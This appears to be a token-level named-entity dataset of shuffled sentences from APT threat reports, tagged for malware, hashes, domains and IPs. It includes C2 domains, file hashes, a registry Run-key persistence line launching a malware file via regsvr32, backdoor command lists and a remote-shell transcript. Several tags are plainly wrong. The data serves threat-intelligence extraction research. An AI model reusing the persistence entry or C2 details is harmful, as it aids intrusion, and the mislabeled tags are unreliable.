folders	O
stored	O
inside	O
the	O
Android	O
device	O
.	O

The	O
data	O
block	O
length	O
is	O
hard-coded	O
(	O
0x150	O
or	O
336	O
bytes	O
)	O
.	O

Some	O
of	O
the	O
information	O
and	O
practices	O
that	O
are	O
shared	O
between	O
users	O
,	O
however	O
,	O
are	O
much	O
less	O
appropriate	O
,	O
even	O
inadvertently	O
dangerous	O
.	O

26-04-2016	O
24-05-2016	O
07-08-2016	O
09-09-2015	O
08-10-2015	O

From	O
my	O
point	O
of	O
view	O
,	O
what	O
's	O
happening	O
and	O
going	O
to	O
happen	O
is	O
:	O
more	O
and	O
more	O
tactics	O
in	O
physical	O
warfare	O
are	O
applied	O
to	O
cyber	O
warfare	O
.	O

Follow	O
us	O
@	O
AccentureSecure	O
on	O
Twitter	O
or	O
visit	O
the	O
Accenture	O
Security	O
blog	O
.	O

ssssss.ddd	O
,	O
which	O
is	O
BKDR_ANEL	B-malware.backdoor
.	O

Essentially	O
,	O
netsat.exe	B-malware.infosteal
appeared	O
to	O
operate	O
as	O
a	O
master	O
program	O
that	O
infected	O
removable	O
media	O
connected	O
to	O
the	O
system	O
whereon	O
it	O
was	O
running	O
and	O
collected	O
data	O
from	O
infected	O
drives	O
when	O
the	O
drives	O
returned	O
.	O

29/12/11	O

Fig	O
5	O
.	O

Depending	O
on	O
the	O
aim	O
of	O
the	O
attack	O
and	O
the	O
Trojan	O
's	O
victim	O
,	O
several	O
driver	O
files	O
can	O
then	O
be	O
signed	O
with	O
legitimate	O
digital	O
certificates	O
whose	O
origins	O
remain	O
unknown	O
.	O

For	O
activists	O
and	O
journalists	O
who	O
are	O
being	O
surveilled	O
by	O
authoritarian	O
governments	O
,	O
surveillance	O
is	O
often	O
just	O
the	O
first	O
step	O
in	O
a	O
campaign	O
of	O
intimidation	O
,	O
threats	O
,	O
and	O
even	O
direct	O
violence	O
.	O

Deleted	O
fi	O
le	O
.	O

It	O
is	O
not	O
directly	O
used	O
from	O
msvcrt.dll	O
but	O
is	O
instead	O
copied	O
to	O
another	O
memory	O
chunk	O
before	O
being	O
called	O
.	O

They	O
are	O
not	O
used	O
for	O
military	O
purposes	O
today	O
.	O

Figure	O
5	O
:	O
Dynamic	O
packet	O
flag	O
|	O
Victim	O
to	O
controller	O
login	O
request	O

Once	O
macros	O
were	O
enabled	O
on	O
the	O
target	O
system	O
,	O
the	O
malicious	O
macros	O
created	O
two	O
named	O
scheduled	O
tasks	O
as	O
persistence	O
mechanisms	O
for	O
two	O
backdoors	O
on	O
the	O
infected	O
system	O
.	O

A	O
four-byte	O
integer	O
that	O
contains	O
the	O
size	O
in	O
bytes	O
of	O
the	O
entire	O
packet	O
.	O

Figure	O
12	O
:	O

We	O
have	O
linked	O
these	O
attacks	O
back	O
to	O
Operation	O
Beebus	O
through	O
the	O
C	O
&	O
C	O
infrastructure	O
along	O
with	O
the	O
similar	O
targets	O
and	O
timeline	O
observed	O
.	O

In	O
turn	O
,	O
the	O
malware	O
uploads	O
the	O
replies	O
back	O
to	O
the	O
server	O
via	O
the	O
same	O
mechanism	O
.	O

Operation	O
Cobalt	O
Kitty	O
was	O
a	O
major	O
cyber	O
espionage	O
APT	O
that	O
targeted	O
a	O
global	O
corporation	O
in	O
Asia	O
and	O
was	O
carried	O
out	O
by	O
the	O
OceanLotus	O
Group	O
.	O

Oldest	O
known	O
CozyDuke	B-malware.drop
module	O
Unencrypted	O
strings	O
Encrypted	O
embedded	O
configuration	O

Attribution	O
such	O
as	O
this	O
allows	O
resolution	O
and	O
visibility	O
into	O
the	O
intent	O
of	O
individual	O
threat	O
groups	O
.	O

While	O
considering	O
attribution	O
of	O
the	O
actors	O
behind	O
Operation	B-malware.ransom
Manul	I-malware.ransom
,	O
we	O
investigated	O
the	O
possibility	O
of	O
infrastructure	O
overlap	O
with	O
known	O
actors	O
.	O

cb1b68d9971c2353c2d6a8119c49b51f	O

Given	O
the	O
amount	O
of	O
data	O
analysis	O
that	O
needed	O
to	O
be	O
done	O
on	O
daily	O
basis	O
,	O
we	O
believe	O
BugDrop	O
was	O
heavily	O
staffed	O
.	O

For	O
example	O
,	O
between	O
the	O
first	O
versions	O
of	O
the	O
RAT	B-malware.backdoor
and	O
the	O
latest	O
,	O
the	O
group	O
started	O
to	O
resolve	O
more	O
API	O
during	O
runtime	O
,	O
using	O
obfuscated	O
strings	O
.	O

An	O
example	O
of	O
a	O
lure	O
used	O
in	O
a	O
RATANKBA	B-malware.backdoor
attack	O
can	O
be	O
seen	O
below	O
:	O

Subsequently	O
the	O
Pravyy	O
Sector	O
group	O
scrubbed	O
their	O
social	O
media	O
page	O
of	O
much	O
of	O
the	O
information	O
associated	O
with	O
this	O
failed	O
operation	O
.	O

Instance-local	O
capabilities	O
are	O
basic	O
spying	O
on	O
window	O
names	O
or	O
snooping	O
on	O
the	O
clipboard	O
data	O
,	O
while	O
the	O
global	O
hooks	O
manage	O
to	O
steal	O
information	O
directly	O
from	O
Windows	O
API	O
calls	O
.	O

Listing	O
of	O
all	O
active	O
processes	O
and	O
opened	O
windows	O
Real-time	O
and	O
offline	O
remote	O
keystroke	O
logging	O
Live	O
video	O
feed	O
of	O
remote	O
web	O
camera	O
,	O
if	O
available	O
Remote	O
listening	O
using	O
microphone	O
if	O
available	O
Remote	O
shutdown	O
and	O
reboot	O
of	O
host	O
Ability	O
to	O
download	O
binaries	O
from	O
the	O
Internet	O
to	O
remote	O
host	O
Fully	O
functional	O
remote	O
shell	O
Complete	O
fi	O
le	O
explorer	O
capabilities	O
for	O
local	O
and	O
remote	O
hosts	O
The	O
Gh0st	B-malware.backdoor
architecture	O
takes	O
advantage	O
of	O
the	O
ability	O
to	O
create	O
custom	O
Windows	O
resources	O
in	O
a	O
Windows	O
binary	O
.	O

The	O
attackers	O
most	O
likely	O
replaced	O
the	O
PowerShell	O
infrastructure	O
after	O
the	O
company	O
used	O
both	O
Windows	O
Group	O
Policy	O
Object	O
(	O
GPO	O
)	O
and	O
Cybereason	O
's	O
execution	O
prevention	O
feature	O
to	O
prevent	O
PowerShell	O
execution	O
.	O

It	O
remains	O
unclear	O
though	O
whether	O
the	O
C	O
&	O
Cs	O
also	O
served	O
to	O
instruct	O
the	O
infected	O
machines	O
per	O
commands	O
,	O
as	O
Babar	B-malware.drop
does	O
not	O
posess	O
obvious	O
command	O
parsing	O
functionality	O
.	O

2	O
)	O
Freegate	B-malware.infosteal
should	O
implement	O
by-default	O
HTTPS	O
on	O
their	O
website	O
.	O

Each	O
element	O
in	O
stable_var_41C	O
is	O
a	O
32-bit	O
DWORD	O
;	O
the	O
elements	O
are	O
initialized	O
to	O
the	O
values	O
0x00000000	O
through	O

Defender.sct	O
–	O
The	O
malicious	O
JavaScript	O
based	O
scriptlet	O
file	O
.	O

Exploiting	O
the	O
human	O
psyche	O
with	O
chat	O
apps	O

중앙관리	O
솔루션을	O
이용한	O
공격은	O
조직	O
전반에	O
걸쳐	O
막대한	O
피해를	O
야기할	O
수	O
있어	O
더욱	O
각별한	O
보안	O
관리가	O
요구된다	O
.	O

We	O
have	O
not	O
identified	O
any	O
other	O
instances	O
of	O
the	O
ICS-specific	O
IRONGATE	B-malware.backdoor
components	O
(	O
scada.exe	B-malware.unknown
and	O
Step7ProSim.dll	O
)	O
,	O
despite	O
their	O
having	O
been	O
compiled	O
in	O
September	O
of	O
2014	O
.	O

That	O
file	O
opens	O
a	O
decoy	O
document	O
and	O
executes	O
an	O
approximately	O
60kb	O
chunk	O
of	O
position	O
independent	O
shellcode	O
.	O

Appendix	O
C	O
:	O
List	O
of	O
Memory	O
Offsets	O
for	O
Some	O
ZxShell	B-malware.backdoor
Functions	O

gmdate	O
(	O
'D	O
,	O
dMYH	O
:	O
i	O
:	O
s	O
'	O
)	O
.	O
'	O

Fidelis	O
researchers	O
decided	O
to	O
look	O
further	O
into	O
the	O
drive	O
and	O
find	O
if	O
there	O
was	O
any	O
possibility	O
of	O
recovering	O
files	O
or	O
logs	O
that	O
would	O
help	O
illuminate	O
what	O
happened	O
to	O
the	O
systems	O
,	O
and	O
if	O
any	O
artifacts	O
of	O
the	O
malware	O
could	O
be	O
recovered	O
.	O

It	O
's	O
important	O
to	O
note	O
that	O
they	O
tweak	O
ready-made	O
files	O
and	O
do	O
n't	O
create	O
a	O
new	O
one	O
from	O
scratch	O
.	O

It	O
then	O
appends	O
the	O
decrypted	O
comms	O
password	O
(	O
stored	O
in	O
the	O
PWD	O
resource	O
)	O
to	O
the	O
end	O
of	O
the	O
preliminary	O
crypto	O
key	O
string	O
to	O
form	O
the	O
final	O
key	O
,	O

Figure	O
24	O
:	O
After	O
following	O
the	O
TCP	O
stream	O
,	O
researchers	O
can	O
see	O
that	O
the	O
majority	O
of	O
the	O
attacker	O
traffic	O
is	O
Base64	O
encoded	O

Control	O
the	O
code	O
with	O
caution	O
to	O
execute	O
ntdll	O
!	O

Clearly	O
this	O
APT	O
is	O
interested	O
in	O
encrypted	O
data	O
and	O
communications	O
.	O

The	O
binary	O
that	O
is	O
decrypted	O
and	O
dropped	O
on	O
the	O
system	O
is	O
the	O
same	O
as	O
the	O
one	O
that	O
communicates	O
with	O
the	O
attacker	O
's	O
endpoint	O
(	O
also	O
known	O
as	O
the	O
RAT	B-malware.backdoor
client	O
or	O
the	O
C2	O
controller	O
)	O
on	O
startup	O
and	O
awaits	O
further	O
instructions	O
.	O

Passes	O
the	O
final	O
buffer	O
to	O
the	O
aforementioned	O
DispatchCommands_sub_493DAC	O
(	O
)	O
function	O
;	O
Yes	O
,	O
this	O
sounds	O
like	O
the	O
main	O
comms	O
loop	O
for	O
which	O
we	O
are	O
looking	O
;	O
we	O
'll	O
name	O
this	O
caller	O
function	O

Once	O
we	O
can	O
identify	O
how	O
the	O
attack	O
happened	O
,	O
we	O
can	O
focus	O
on	O
what	O
's	O
really	O
important	O
–	O
prevention	O
.	O

VIC	O
TIM	O
TIM	O
E	O
FR	O
AM	O
E	O
AP	O
T2	O
8	O
N	O
ET	O
WOR	O
K	O
AC	O
TIVIT	O
Y	O

Additional	O
longer	O
term	O
recommendations	O
for	O
financial	O
institutions	O
:	O
•	O
Practice	O
incident	O
response	O
scenarios	O
which	O
include	O
complex	O
attacks	O
combining	O
covert	O
payment	O
fraud	O
and	O
overt	O
network	O
disruption	O
through	O
ransomware	O
,	O
DDoS	O
,	O
network	O
downtime	O
,	O
etc	O
.	O

Recently	O
,	O
media	O
(	O
1	O
)	O
reported	O
of	O
a	O
targeted	O
attack	O
against	O
the	O
Israeli	O
government	O
,	O
in	O
the	O
form	O
of	O
emails	O
purporting	O
to	O
come	O
from	O
IDF	O
Chief	O
of	O
Staff	O
Benny	O
Gantz	O
with	O
a	O
malicious	O
attachment	O
.	O

The	O
Spanish	O
networks	O
resolved	O
to	O
departments	O
supporting	O
the	O
digital	O
transformation	O
of	O
Spanish	O
public	O
services	O
and	O
multi-disciplined	O
universities	O
.	O

This	O
app	O
is	O
non-malicious	O
.	O

Receiving	O
commands	O
from	O
the	O
C	O
&	O
C	O
The	O
first	O
command	O
includes	O
the	O
string	O
'	O
cache.txt	O
'	O
.	O

These	O
files	O
were	O
likely	O
created	O
by	O
exporting	O
Word	O
documents	O
into	O
single	O
file	O
web	O
pages	O
.	O

The	O
public	O
release	O
significantly	O
increases	O
the	O
possibility	O
of	O
widespread	O
attacks	O
exploiting	O
the	O
vulnerability	O
,	O
putting	O
Internet	O
Explorer	O
users	O
at	O
potentially	O
serious	O
risk	O
.	O

For	O
documents	O

'	O
DCCC	O
Cyber	O
Breach	O
.	O
'	O

The	O
following	O
screen	O
shots	O
were	O
obtained	O
while	O
connected	O
to	O
the	O
malware	O
:	O

The	O
size	O
of	O
the	O
encoded	O
data	O
is	O
specified	O
in	O
the	O
last	O
4	O
bytes	O
of	O
the	O
image	O
file	O
.	O

It	O
is	O
also	O
possible	O
that	O
the	O
group	O
deployed	O
another	O
zero	B-malware.backdoor
day	I-malware.backdoor
exploit	I-malware.backdoor
,	O
CVE-2016-0147	O
,	O
which	O
was	O
patched	O
in	O
April	O
.	O

The	O
majority	O
of	O
the	O
targets	O
of	O
the	O
malware	O
campaign	O
are	O
currently	O
embroiled	O
in	O
legal	O
disputes	O
with	O
the	O
government	O
of	O
Kazakhstan	O
in	O
European	O
courts	O
or	O
are	O
the	O
family	O
members	O
or	O
associates	O
of	O
people	O
involved	O
in	O
these	O
disputes	O
.	O

The	O
VBS	O
file	O
(	O
Figure	O
18	O
)	O
will	O
launch	O
and	O
execute	O
the	O
downloaded	O
legitimate	O
Windows	O
tool	O
,	O
which	O
in	O
this	O
case	O
is	O
Certmgr.exe	O
.	O

Once	O
in	O
the	O
context	O
of	O
a	O
desired	O
target	O
process	O
,	O
the	O
malware	O
goes	O
on	O
to	O
hook	O
specific	O
APIs	O
of	O
interest	O
.	O

This	O
activity	O
is	O
possibly	O
linked	O
to	O
an	O
identified	O
Pakistani	O
information	O
security	O
company	O
.	O

The	O
technique	O
of	O
hosting	O
malicious	O
code	O
in	O
legitimate	O
sites	O
like	O
Pastebin	O
has	O
advantages	O
and	O
it	O
is	O
highly	O
unlikely	O
to	O
trigger	O
any	O
suspicion	O
in	O
security	O
monitoring	O
and	O
also	O
can	O
bypass	O
reputation	O
based	O
devices	O
.	O

.مداقلا	O
نيطسلف	O
ةلود	O
سيئر	O
)	O
نلاحد	O
دمحم	O
(	O
تاريدقتو	O
ليلحت	O

As	O
mentioned	O
earlier	O
,	O
this	O
malware	O
creates	O
two	O
new	O
binaries	O
:	O
AYRUNSC.exe	O
and	O
PTL.AYM	O
.	O

This	O
blog	O
post	O
is	O
authored	O
by	O
Warren	O
Mercer	O
and	O
Paul	O
Rascagneres	O
and	O
Andrew	O
Williams	O
.	O

중앙관리	O
소프트웨어를	O
수비하라	O
http://image.ahnlab.com/file_upload/asecissue_files/ASEC_REPORT_vol.89.pdf	O
유명	O
기업	O
보안	O
시스템을	O
연달아	O
뚫다	O
,	O
대범한	O
해킹조직의	O
공격	O
-1편	O
http://blog.skinfosec.com/221234553836	O
유명	O
기업	O
보안	O
시스템을	O
연달아	O
뚫다	O
,	O
대범한	O
해킹조직의	O
공격	O
-2편	O
http://blog.skinfosec.com/221234742268	O
하나투어	O
개인정보유출	O
...	O
수탁업체서	O
시작	O
https://blog.naver.com/secustory/221213258234	O

This	O
malware	O
allowed	O
attackers	O
to	O
control	O
the	O
computer	O
as	O
a	O
compromised	O
zombie	O
part	O
of	O
a	O
wider	O
botnet	O
network	O
–	O
a	O
theory	O
suggested	O
by	O
Alienvault	O
–	O
which	O
then	O
wiped	O
hard	O
disks	O
,	O
and	O
harvested	O
personal	O
information	O
.	O

Figure	O
15	O
.	O

APT28	B-malware.infosteal
uses	O
a	O
legitimate	O
user	O
account	O
belonging	O
to	O
a	O
Russian	O
athlete	O
to	O
log	O
into	O
WADA	O
's	O
AntiDoping	O
Administration	O
and	O
Management	O
System	O
(	O
ADAMS	O
)	O
database	O
.	O

However	O
,	O
unlike	O
the	O
samples	O
from	O
the	O
previous	O
campaigns	O
,	O
the	O
lure	O
document	O
deals	O
with	O
a	O
different	O
subject	O
matter	O
.	O

©	O
AhnLab	O
,	O
Inc	O
.	O

Use	O
of	O
Silent	O
UAC	O
(	O
user	O
account	O
control	O
)	O
bypass	O
technique	O

.........................................................................................................................................	O
5	O
Targeting	O
in	O
Hebrew	O
and	O
English	O
.................................................................................................................	O
5	O
Targeting	O
in	O
arabic	O
.......................................................................................................................................	O
9	O
What	O
are	O
they	O
after	O
?	O

Samples	O
uploaded	O
which	O
include	O
known	O
Lazarus	B-malware.unknown
malware	O
.	O

The	O
difference	O
in	O
domain	O
registration	O
patterns	O
could	O
indicate	O
threat	O
actor	O
preference	O
,	O
or	O
could	O
indicate	O
there	O
are	O
at	O
least	O
two	O
groups	O
using	O
this	O
malware	O
whose	O
infrastructure	O
at	O
times	O
overlaps	O
.	O

The	O
DLLs	O
that	O
IRONGATE	B-malware.backdoor
seeks	O
and	O
replaces	O
are	O
not	O
part	O
of	O
the	O
Siemens	O
standard	O
product	O
set	O
,	O
but	O
communicate	O
with	O
the	O
S7ProSim	O
COM	O
object	O
.	O

The	O
following	O
day	O
,	O
the	O
attackers	O
spread	O
an	O
Android	O
malware	O
binded	O
with	O
legitimate	O
Android	O
application	O
from	O
the	O
compromised	O
Telegram	O
account	O
to	O
all	O
his	O
contacts	O
pretending	O
it	O
is	O
an	O
important	O
voice	O
message	O
(	O
misspelled	O
it	O
by	O
'	O
Voice	O
Massege.apk	O
'	O
)	O
which	O
indicates	O
a	O
non-english	O
(	O
maybe	O
an	O
Arabic	O
)	O
attacker	O
.	O

The	O
following	O
exploit	O
documents	O
were	O
identified	O
to	O
contain	O
a	O
payload	O
which	O
communicated	O
to	O
this	O
domain	O
:	O

Decoy	O
Document	O
Title	O
:	O

However	O
,	O
its	O
functionality	O
can	O
be	O
extended	O
by	O
the	O
hacker	O
.	O

The	O
dwChecksum	O
value	O
is	O
sum	O
of	O
all	O
of	O
the	O
bytes	O
within	O
the	O
optional	O
header	O
(	O
the	O
field	O
is	O
ignored	O
,	O
but	O
present	O
,	O
if	O
there	O
is	O
no	O
payload	O
section	O
)	O
.	O

e66d795d0c832ad16381d433a13a2cb57ab097d90e9c73a1178a95132b1c0f70	B-hash

The	O
dropped	O
file	O
is	O
a	O
variant	O
of	O
the	O
Hermes	B-malware.ransom
ransomware	O
.	O

The	O
Carbanak	B-malware.infosteal
financial	O
APT	O
group	O
made	O
the	O
headlines	O
when	O
Group-IB	O
and	O
Fox-IT	O
broke	O
the	O
news	O
in	O
December	O
2014	O
,	O
followed	O
by	O
the	O
Kaspersky	O
report	O
in	O
February	O
2015	O
.	O

Parser	O
:	O
:inString	O
,	O
and	O
Parser	O
:	O
:inInt	O
.	O

We	O
assess	O
with	O
high	O
confidence	O
that	O
the	O
author	O
is	O
based	O
out	O
of	O
in	O
India	O
.	O

Base64	O
and	O
XOR	O
Encryption	O
Scheme	O

According	O
to	O
the	O
documentation	O
,	O
however	O
,	O
it	O
does	O
n't	O
work	O
for	O
firmware	O
versions	O
higher	O
than	O
6.30	O
.	O

It	O
provides	O
a	O
comprehensive	O
defense	O
tailored	O
to	O
protect	O
organizations	O
against	O
targeted	O
attacks	O
and	O
advanced	O
threats	O
through	O
specialized	O
engines	O
,	O
custom	O
sandboxing	O
,	O
and	O
seamless	O
correlation	O
across	O
the	O
entire	O
attack	O
lifecycle	O
,	O
allowing	O
it	O
to	O
detect	O
threats	O
even	O
without	O
any	O
engine	O
or	O
pattern	O
update	O
.	O

A	O
200.63.46.23	O
19	O
www.maxheadroomdvdseries.com	B-url.unknown
.	O

Their	O
operational	O
security	O
is	O
good	O
.	O

The	O
particular	O
topic	O
of	O
this	O
decoy	O
document	O
also	O
appears	O
to	O
be	O
a	O
common	O
link	O
between	O
most	O
of	O
the	O
targets	O
we	O
have	O
seen	O
:	O
unmanned	O
vehicles	O
.	O

This	O
malware	O
was	O
written	O
bespoke	O
for	O
attacking	O
a	O
specific	O
victim	O
infrastructure	O
,	O
but	O
the	O
general	O
tools	O
,	O
techniques	O
and	O
procedures	O
used	O
in	O
the	O
attack	O
may	O
allow	O
the	O
gang	O
to	O
strike	O
again	O
.	O

sub_44C1C0	O
(	O
)	O
;	O
the	O
output	O
buffer	O
is	O
then	O
copied	O
back	O
into	O
the	O
original	O
source	O
buffer	O
src_buf_var_4	O
:	O

DICT	O
is	O
the	O
agency	O
responsible	O
for	O
the	O
planning	O
,	O
development	O
,	O
and	O
promotion	O
of	O
the	O
Philippines	O
'	O
information	O
and	O
communications	O
technology	O
including	O
cybersecurity	O
.	O

Its	O
code	O
looks	O
something	O
like	O
this	O
:	O
x	O
=	O
s	O
[	O
i	O
]	O
;	O
j	O
=	O
(	O
(	O
x	O
&	O
0xF0	O
)	O
>	O
>	O
4	O
)	O
;	O
y	O
=	O
x	O
^	O
j	O
;	O
Using	O
that	O
cipher	O
in	O
the	O
ralrab[.]com	B-url.normal
malware	O
,	O
the	O
package	O
is	O
configured	O
to	O
seek	O
out	O
several	O
crypto-enabled	O
software	O
applications	O
,	O
highlighting	O
the	O
group	O
's	O
interest	O
in	O
users	O
of	O
more	O
encryption-supported	O
software	O
suites	O
.	O

Dropper	O
MD5	O
:	O
DLL	O
Filename	O
:	O
Mutex	O
:	O
C	O
&	O
C	O
Host	O
:	O
Decoded	O
'	O
i	O
'	O
Value	O
:	O
Compile	O
Time	O
:	O

The	O
threat	O
actor	O
has	O
consistently	O
used	O
attachment	O
names	O
of	O
documents/white	O
papers	O
released	O
by	O
well­known	O
companies	O
.	O

In	O
2016	O
,	O
Vietnamese	O
and	O
foreign-owned	O
corporations	O
working	O
in	O
network	O
security	O
,	O
technology	O
infrastructure	O
,	O
banking	O
,	O
and	O
media	O
industries	O
were	O
targeted	O
.	O

Once	O
we	O
Analyzed	O
the	O
backdoor	O
sample	O
,	O
we	O
immediately	O
noticed	O
it	O
's	O
partially	O
based	O
on	O
HackingTeam	O
's	O
source	O
code	O
for	O
their	O
Remote	O
Control	O
System	O
hacking	O
tool	O
,	O
which	O
leaked	O
about	O
3	O
years	O
ago	O
.	O

[	O
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run	O
]	O
AdobePlayer='regsvr32	O
/s	O
%	O
AppData%\malware\adobe\adobe.dat	O
'	O

Legitimate	O
free	O
web	O
hosting	O
sites	O
for	O
its	O
command-and-control	O
infrastructure	O
.	O

6E416C45A833F959A63785892042595A	B-hash
hint.zapto.org	B-url.cncsvr

In	O
previous	O
attacks	O
it	O
would	O
simply	O
have	O
taken	O
advantage	O
of	O
a	O
long	O
list	O
of	O
weakly	O
implemented	O
,	O
broken	O
certificates	O
.	O

DESCRIPTION	O

Even	O
binary	O
instrumentation	O
tools	O
like	O
PIN	O
or	O
DynamoRio	O
prevent	O
the	O
malware	O
from	O
running	O
.	O

For	O
example	O
,	O
if	O
the	O
payload	O
has	O
'D	O
,	O
e	O
,	O
A	O
'	O
paired	O
with	O
'	O
0,5,19	O
'	O
,	O
this	O
results	O
in	O
the	O
following	O
mapping	O
:	O
'D	O
'	O
at	O
offset	O
0	O
in	O
API	O
function	O
name	O
'	O
e	O
'	O
at	O
offset	O
5	O
in	O
API	O
function	O
name	O
'	O
A	O
'	O
at	O
offset	O
19	O
in	O
API	O
function	O
name	O
The	O
payload	O
loads	O
a	O
specific	O
Windows	O
library	O
's	O
EAT	O
by	O
calling	O
the	O
ImageDirectoryEntryToData	O
API	O
function	O
using	O
the	O
IMAGE_DIRECTORY_ENTRY_EXPORT	O
flag	O
.	O

Hmas.doc	O
:	O
484hhh.doc	O
:	O
Word.doc	O
:	O

else	O

The	O
macro	O
shown	O
in	O
Exhibit	O
2	O
will	O
then	O
perform	O
the	O
following	O
sequence	O
of	O
actions	O
:	O
Drop	O
the	O
embedded	O
base64-encoded	O
content	O
into	O
a	O
new	O
file	O
,	O
ZsHUvtNctKYbgPj.txt	O
,	O
in	O
the	O
%	O
temp	O
%	O
folder	O
Decode	O
this	O
new	O
file	O
by	O
leveraging	O
'	O
certutil	O
'	O
,	O
a	O
legitimate	O
Windows	O
program	O
;	O
the	O
base64	O
encoded	O
data	O
decodes	O
to	O
a	O
Microsoft	O
Corp	O
.	O

The	O
backdoor	O
communicates	O
with	O
its	O
Command-and-Control	O
(	O
C	O
&	O
C	O
server	O
)	O
,	O
hxxp://outl00k[.]net,	B-url.unknown
to	O
send	O
and	O
receive	O
the	O
following	O
commands	O
:	O
PRB-CREATEALIVE	O
Initializes	O
connection	O
with	O
the	O
C	O
&	O
C	O
Server	O
PRB-CREATEINTRODUCE	O
Registers/introduces	O
the	O
affected	O
machine	O
to	O
PRB-History	O
the	O
C	O
&	O
C	O
server	O
Gather	O
browsing	O
histories	O
from	O
different	O
browsers	O
and	O
send	O
it	O
to	O
the	O
C	O
&	O
C	O
server	O
using	O
the	O
'	O
sendfile	O
'	O
function	O
PRB-PASSWORD	O
Steals	O
passwords	O
listed	O
or	O
found	O
in	O
the	O
PRB-READFILE	O
PRB-WRITEFILE	O
PRB-Shell	O
PRB-Logger	O
browser	O
histories	O
Reads	O
files	O
Writes	O
files	O
Executes	O
shell	O
commands	O
Calls	O
the	O
'	O
Logger	O
'	O
function	O
,	O
used	O
to	O
record	O
keyboard	O
strokes	O
PRB-Shot	O
Triggers	O
the	O
SNAP	O
function	O
,	O
used	O
to	O
capture	O
PRB-funcupdate	O
sysinfo	O
Start_Dns	O
screenshots	O
Updates	O
functions	O
Gathers	O
system	O
information	O
Initializes	O
DNS	O
Session/Connection	O
If	O
these	O
samples	O
are	O
indeed	O
related	O
to	O
MuddyWater	O
,	O
this	O
means	O
that	O
the	O
threat	O
actors	O
behind	O
MuddyWater	O
are	O
continuously	O
evolving	O
their	O
tools	O
and	O
techniques	O
to	O
make	O
them	O
more	O
effective	O
and	O
persistent	O
.	O

Symantec	O
has	O
the	O
following	O
protection	O
in	O
place	O
to	O
protect	O
customers	O
against	O
these	O
attacks	O
:	O

APPENDIX	O
A	O

It	O
is	O
called	O
ELISE	B-malware.drop
after	O
certain	O
strings	O
found	O
in	O
its	O
unpacked	O
code	O
.	O

People	O
do	O
,	O
'	O
said	O
root9B	O
.	O

This	O
vulnerability	O
can	O
be	O
leveraged	O
by	O
attackers	O
of	O
varying	O
skill	O
levels	O
due	O
to	O
the	O

This	O
probably	O
is	O
an	O
attempt	O
to	O
detect	O
virtualized	O
environments	O
such	O
as	O
sandboxes	O
,	O
as	O
well	O
as	O
other	O
analysis	O
environments	O
used	O
by	O
reverse	O
engineers	O
,	O
which	O
often	O
tend	O
to	O
be	O
configured	O
with	O
a	O
single	O
core	O
.	O

Sample	O
B	O
,	O
contained	O
in	O
Sample	O
A	O
,	O
can	O
be	O
categorized	O
as	O
an	O
exhaustive	O
backdoor	O
,	O
implementing	O
any	O
kind	O
of	O
functionality	O
that	O
can	O
be	O
expected	O
for	O
this	O
kind	O
of	O
attacks	O
.	O

One	O
of	O
them	O
transferred	O
shares	O
of	O
NEO	O
at	O
a	O
good	O
market	O
price	O
.	O

E211C2BAD9A83A6A4247EC3959E2A730	B-hash
drops	O
the	O
following	O
files	O
:	O

The	O
first	O
operation	O
inside	O
the	O
loop	O
is	O
to	O
test	O
whether	O
or	O
not	O
the	O
value	O
of	O
the	O
first	O
source	O
byte	O
in	O
the	O
pair	O
is	O
greater	O
than	O
0x39	O
,	O
and	O
branch	O
accordingly	O
.	O

A	O
200.63.46.23	B-ip.unknown
14	O
www.sexandthecityondvd.com	B-url.unknown
.	O

Many	O
of	O
the	O
targets	O
are	O
involved	O
in	O
litigation	O
with	O
the	O
government	O
of	O
Kazakhstan	O
in	O
European	O
and	O
American	O
courts	O
whose	O
substance	O
ranges	O
from	O
attempts	O
by	O
the	O
government	O
of	O
Kazakhstan	O
to	O
unmask	O
the	O
administrators	O
behind	O
an	O
anonymous	O
website	O
that	O
publishes	O
leaks	O
alleging	O
government	O
corruption	O
(	O
Kazaword	O
)	O
to	O
allegations	O
of	O
kidnapping	O
.	O

This	O
same	O
code	O
has	O
also	O
been	O
observed	O
being	O
served	O
from	O
another	O
Hong	O
Kong	O
website	O
described	O
in	O
the	O
next	O
section	O
.	O

C	O
:	O
\WINDOWS\system32	O
>	O
shell	O
>	O
tasklist	O
$	O
shell	O
$	O
tasklist	O
$	O
shell	O
$	O
Image	O
Name	O
PID	O
Session	O
Name	O
Session	O
#	O
Mem	O
Usage	O
=========================	O
======	O
================	O
========	O
============	O
System	O
Idle	O
Process	O
0	O
Console	O
0	O
28	O
K	O
System	O
4	O
Console	O
0	O
236	O
K	O
smss.exe	O
368	O
Console	O
0	O
388	O
K	O
csrss.exe	O
584	O
Console	O
0	O
3,740	O
K	O
winlogon.exe	O
608	O
Console	O
0	O
4,312	O
K	O
services.exe	O
652	O
Console	O
0	O
3,368	O
K	O
lsass.exe	O
664	O
Console	O
0	O
6,152	O
K	O
VBoxService.exe	O
820	O
Console	O
0	O
3,092	O
K	O
svchost.exe	O
864	O
Console	O
0	O
4,696	O
K	O
svchost.exe	O
952	O
Console	O
0	O
4,252	O
K	O
svchost.exe	O
1044	O
Console	O
0	O
20,424	O
K	O
svchost.exe	O
1100	O
Console	O
0	O
3,584	O
K	O
svchost.exe	O
1160	O
Console	O
0	O
4,268	O
K	O
spoolsv.exe	O
1428	O
Console	O
0	O
4,996	O
K	O
explorer.exe	O
1656	O
Console	O
0	O
29,944	O
K	O
VBoxTray.exe	O
1820	O
Console	O
0	O
3,620	O
K	O
GrooveMonitor.exe	O
1868	O
Console	O
0	O
4,340	O
K	O
ctfmon.exe	O
1888	O
Console	O
0	O
3,148	O
K	O
jqs.exe	O
2040	O
Console	O
0	O
1,396	O
K	O
vmware-usbarbitrator.exe	O
248	O
Console	O
0	O
3,180	O
K	O
alg.exe	O
1380	O
Console	O
0	O
3,440	O
K	O
wscntfy.exe	O
1692	O
Console	O
0	O
1,804	O
K	O
wuauclt.exe	O
1116	O
Console	O
0	O
6,568	O
K	O
svchost.exe	O
796	O
Console	O
0	O
4,088	O
K	O
cmd.exe	O
480	O
Console	O
0	O
2,624	O
K	O
tasklist.exe	O
724	O
Console	O
0	O
4,068	O
K	O
wmiprvse.exe	O
1256	O
Console	O
0	O
5,544	O
K	O
C	O
:	O
\WINDOWS\system32	O
>	O
While	O
the	O
interaction	O
with	O
the	O
bots	O
could	O
also	O
be	O
scripted	O
,	O
it	O
might	O
be	O
plausible	O
that	O
the	O
operators	O
of	O
these	O
intrusions	O
might	O
be	O
interacting	O
with	O
their	O
targets	O
exclusively	O
manually	O
to	O
collect	O
different	O
data	O
depending	O
on	O
each	O
individual	O
they	O
infected	O
and	O
